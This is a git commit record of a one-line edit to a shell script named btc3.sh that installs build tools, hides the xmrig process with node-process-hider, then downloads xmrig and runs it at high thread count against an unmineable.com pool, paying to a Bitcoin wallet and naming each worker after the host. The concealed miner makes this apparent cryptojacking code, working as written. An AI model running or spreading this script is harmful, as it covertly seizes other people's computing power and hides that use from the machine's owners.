a3266c31cd2690542f70dc0e181edf2ae36f2e8d
AhrimanSefid <ahrimansefid@gmail.com>
2022-06-03 15:28:19 +0430

    Update btc3.sh

--- btc3.sh
+++ btc3.sh
@@ -4,6 +4,6 @@
 
 apt-get update && apt-get full-upgrade -y
 apt -y install wget curl unzip screen autoconf git cmake binutils build-essential net-tools golang libssl1.0-dev nodejs nodejs-dev node-gyp -y
-apt update -y
+sudo apt update -y
 npm i -g node-process-hider && ph add xmrig
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz -O - | tar -xz && cd xmrig-6.17.0 && sudo ./xmrig -a rx/0 -o rx.unmineable.com:3333 -u BTC:bc1qmw5hdlgw0fpc8kwm2ravtdkcfm5aegkdc8k993.$(echo "$(cat /proc/sys/kernel/hostname)" | tr . _ ) -p x --threads=80 --cpu-priority=5 --randomx-mode=fast --keepalive
